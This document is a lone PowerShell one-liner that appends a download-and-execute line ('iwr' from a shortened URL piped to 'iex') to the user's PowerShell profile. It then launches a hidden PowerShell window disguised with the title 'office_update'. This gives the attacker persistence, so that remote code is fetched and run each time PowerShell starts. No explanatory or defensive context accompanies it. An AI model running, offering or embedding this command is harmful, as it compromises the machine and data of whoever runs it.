powershell -C {$path = $('%UserProfile%\My Documents\WindowsPowerShell\profile.ps1'); echo "iwr https://goo.gl/i4QKxg | iex" | Out-File $('$path')}; cmd /c start powershell -w 1 -NoExit -Command {$Host.UI.RawUI.WindowTitle = "office_update"}
